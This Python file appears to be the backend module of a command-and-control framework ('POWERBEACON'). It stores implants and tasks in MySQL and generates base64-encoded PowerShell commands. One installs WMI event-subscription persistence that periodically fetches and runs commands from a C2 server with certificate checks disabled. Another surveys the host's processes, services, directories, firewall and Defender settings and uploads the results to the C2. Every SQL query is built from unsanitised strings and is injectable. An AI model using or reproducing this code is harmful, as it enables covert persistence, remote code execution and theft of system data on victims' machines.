#!/usr/bin/python3

from flask import Flask,render_template,request,redirect,url_for,flash,make_response
import time
from base64 import b64encode
import MySQLdb


def getCheckIns(connection, UUID, depth):
    """
    Retrieves the check-in details for a given UUID from the database.

    Args:
        connection: The database connection object.
        UUID (str): The UUID of the implant.
        depth (int): The number of check-ins to retrieve.

    Returns:
        list: A list of dictionaries containing the check-in details.
    """
    cur = connection.cursor()
    connection.commit()
    implants = cur.execute("select * from checkins where UUID='" + UUID + "' order by last_checkin desc limit " + depth)
    implantDetails = cur.fetchall()
    cur.close()
    return implantDetails

def getTasks(connection, UUID, complete):
    """
    Retrieve tasks from the database based on the completion status.

    Args:
        connection: The database connection object.
        UUID: The UUID of the task.
        complete: The completion status of the task.

    Returns:
        A list of task details, including id, UUID, task, notes, and time_complete.
    """
    cur = connection.cursor()
    connection.commit()
    # Retrieve tasks from the database based on the completion status
    tasks = cur.execute(f"SELECT id, UUID, task, notes, time_complete FROM tasks WHERE (is_complete={complete}) ORDER BY id DESC")
    taskDetails = cur.fetchall()
    cur.close()
    return taskDetails

def getDetails(connection, UUID):
    cur = connection.cursor()
    connection.commit()
    implant = cur.execute(f"SELECT * FROM implants WHERE UUID='{UUID}'")
    implantDetails = cur.fetchall()
    cur.close()
    return implantDetails

def getImplantList(connection):
    cur = connection.cursor()
    connection.commit()
    implants = cur.execute("select * from implants")
    implants = cur.fetchall()
    cur.close()
    return implants 

def getC2List(connection):
    cur = connection.cursor()
    c2listget = cur.execute("select * from callbackAddresses")
    c2list = cur.fetchall()    
    cur.close()
    return(c2list)


def getSurveyList(connection, UUID):
    connection.commit()
    cur = connection.cursor()
    surveyData = cur.execute(f"select id, UUID, delivered, details, data from datastore where (uuid = '{UUID}') order by delivered desc limit 30")
    surveyData = cur.fetchall()
    cur.close()
    return surveyData

def addImplant(connection, UUID, implantkey, notes, c2, filter, consumer):
    """
    Inserts a new implant record into the database.

    Parameters:
    - connection: The database connection object.
    - UUID: The UUID of the implant.
    - implantkey: The implant key.
    - notes: Additional notes for the implant.
    - c2: The command and control server for the implant.
    - filter: The filter for the implant.
    - consumer: The consumer of the implant.

    Returns:
    None
    """
    cur = connection.cursor()
    cur.execute(f"INSERT INTO implants (UUID, implantkey, notes, c2, filter, consumer) VALUES ('{UUID}', '{implantkey}', '{notes}', '{c2}', '{filter}', '{consumer}')")
    connection.commit()
    cur.close()
    return

def addImplant(connection,UUID,implantkey,notes,c2,filter,consumer):
    cur=connection.cursor()
    cur.execute(f"INSERT INTO implants (UUID,implantkey,notes,c2,filter,consumer) VALUES ('{UUID}','{implantkey}','{notes}','{c2}','{filter}','{consumer}')")
    connection.commit()
    cur.close()
    return

def addTask(connection,UUID,task,notes):
    connection.commit()
    cur = connection.cursor()
    cur.execute(f"INSERT INTO tasks (UUID,task,notes) VALUES ('{UUID}','{task}','{notes}')")
    connection.commit()
    cur.close()
    return


def deleteTask(connection,taskID):
    cur=connection.cursor()
    connection.commit()
    cur.execute(f"SELECT is_complete FROM tasks WHERE id = {taskID}")
    isComplete = cur.fetchall()
    isComplete=isComplete[0][0]
    if isComplete == 0:
        cur.execute(f"delete from tasks where (id={taskID}) and (is_complete=0)")
        connection.commit()
        cur.close()
    else:
        cur.close()
        raise ValueError('The task has already completed')
    return

def updateNotes(connection,UUID,notes):
    cur=connection.cursor()
    cur.execute(f"update implants set notes='{notes}' where (UUID='{UUID}')")
    connection.commit()
    cur.close()
    return

def deleteImplant(connection,UUID):
    cur=connection.cursor()
    cur.execute(f"DELETE FROM implants WHERE UUID = '{UUID}'")
    connection.commit()
    cur.close()
    return

def uninstallImplant(connection,UUID):
    uninstallTask=generateInstall(connection,UUID,0)
    uninstallTask=uninstallTask[1]
    addTask(connection,UUID,uninstallTask,"Implant tasked for uninstall")
    return 

def updateSettings(connection,UUID,notes,C2,filter,consumer,interval):
    cur=connection.cursor()
    uninstall = generateInstall(connection,UUID,interval)[1]      #Get the current uninstall information
    cur.execute(f"UPDATE implants SET notes = '{notes}', c2 = '{C2}', filter = '{filter}', consumer = '{consumer}' WHERE UUID = '{UUID}'")
    connection.commit()
    cur.close()
    install = generateInstall(connection,UUID,interval)[0]       #Get the new install information
    uninstallReinstall =  uninstall + ";" + install
    addTask(connection,UUID,uninstallReinstall,"POWERBEACON SYSTEM TASK: Update Implant Settings")
    return    


def generateSurvey(connection,UUID,options,notes):
#Options Key
#[0]Directories
#[1]firewall/netsh
#[2]mp-preference

    task = "$message=(hostname)\n"
    task = task+"$message+= (systeminfo) | Out-String\n"
    task = task+"$message+= (get-process | select-object id, name, path) | Out-String\n"
    task = task+"$message+= (get-service) | Out-String\n"
    if options[0]:
        task = task+"$message+= (get-childitem c:\) | Out-String\n"
        task = task+"$message+= (get-childitem c:\windows) | Out-String\n"
        task = task+"$message+= (get-childitem c:\windows\system32) | Out-String\n"
        task = task+"$message+= (get-childitem \"c:\program files\") | Out-String\n"
        task = task+"$message+= (get-childitem \"c:\program files (x86)\")| Out-String -errorAction SilentlyContinue\n"
    if options[1]:
        task = task+"$message+= \"PortProxy Settings:\"\n"
        task = task+"$message+= (netsh interface portproxy show all) | Out-String\n"
        task = task+"$message+= \"Firewall Profiles:\"\n"
        task = task+"$message+= (get-netconnectionprofile) | Out-String\n"
        task = task+"$message+= (get-netfirewallprofile) | Out-String\n"
    if options[2]:
        task = task+"$message+= (get-mppreference) | Out-String\n"
    
    
    cur=connection.cursor()      #Get C2 address from database
    cur.execute("select c2,implantkey from implants where (UUID = '" + UUID + "')")
    data=cur.fetchall()
    address=data[0][0]
    key=data[0][1]
    task=task+ "$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)\n$EncodedText =[Convert]::ToBase64String($Bytes)\n" 
    if address[4] == "s":     #ssl bumper if needed
        task = task+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"        
    task = task + f"(New-Object Net.Webclient).UploadString('{address}', \"{{ 'UUID':'{UUID}', 'key':'{key}', 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '{notes}'  }}\")"
    
    task = b64encode(task.encode('UTF-16LE')).decode('UTF-8')
    task = encodedtask = "powershell -e " + task

    return(task)

def generateInstall(connection,UUID,interval):
    interval=int(interval)
    cur=connection.cursor()
    connection.commit()
    cur.execute("select * from implants where (UUID='" + UUID + "')")
    implant = cur.fetchall()
    implant=implant[0]
    cur.close()
    UUID = implant[0]
    key = implant[1]
    address = implant[3]
    filter = implant[4]
    consumer = implant[5]
    ssl = False

    if address[4] == "s": #Check http"s" for ssl
        ssl = True
    #set WMIQuery based on interval
    #
    #
    #

    if interval==1:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0\""
    if interval==2:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=15 OR TargetInstance.Minute=30 OR TargetInstance.Minute=45) AND TargetInstance.Second=0\""
    if interval==3:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=30) AND TargetInstance.Second=0\""
    if interval==4:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1) AND TargetInstance.Second=0\""
    if interval==5:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Hour=0 OR TargetInstance.Hour=4 OR TargetInstance.Hour=8 OR TargetInstance.Hour=12 OR TargetInstance.Hour=16 OR TargetInstance.Hour=20) AND TargetInstance.Minute=1 AND TargetInstance.Second=0\""
    if interval==0:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Second=0 OR TargetInstance.Second=15 OR TargetInstance.Second=30 OR TargetInstance.Second=45)\""


    #BuildConsumer Block
    messageblock = f"iex(New-Object Net.Webclient).UploadString('{address}', \"{{ 'UUID':'{UUID}', 'key':'{key}', 'event' : 'req' }}\")"
   
    if ssl: #Add SSL powershell cert check overide if SSL
        messageblock = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + messageblock
    
    messageblock = b64encode(messageblock.encode('UTF-16LE')).decode('UTF-8') #base64 encode this
    messageblock = f"\"powershell -e {messageblock}\""  # add the 'powershell -e'
     
    #Create WMI Event Subscription Data
    data=f'''
$instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance();
$instanceFilter.QueryLanguage = "WQL";
{interval_setting};
$instanceFilter.Name = "{filter}";
$instanceFilter.EventNamespace = 'root\cimv2';
$result = $instanceFilter.Put();
$newFilter = $result.Path;
$instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance();
$instanceConsumer.Name = '{consumer}' ;
$instanceConsumer.CommandLineTemplate  = {messageblock};
$result = $instanceConsumer.Put();
$newConsumer = $result.Path;
$instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance();
$instanceBinding.Filter = $newFilter;
$instanceBinding.Consumer = $newConsumer;
$result = $instanceBinding.Put();
$newBinding = $result.Path

'''
  
    #Create uninstall commands

    remove_data = f'''
$x="\\\.\\root\subscription:__EventFilter.Name='{filter}'"
([wmi]$x).Delete()
$x="\\\.\\root\subscription:CommandLineEventConsumer.Name='{consumer}'"
([wmi]$x).Delete()
$x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\"{consumer}\\"",Filter="\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\"{filter}\\""'
([wmi]$x).Delete()
'''
  
    #base64 encode everything
    data = b64encode(data.encode('UTF-16LE')).decode('UTF-8')
    remove_data = b64encode(remove_data.encode('UTF-16LE')).decode('UTF-8')
    data = "powershell -e " + data
    remove_data = "powershell -e " + remove_data
    installLines=[data,remove_data]    
    return(installLines)
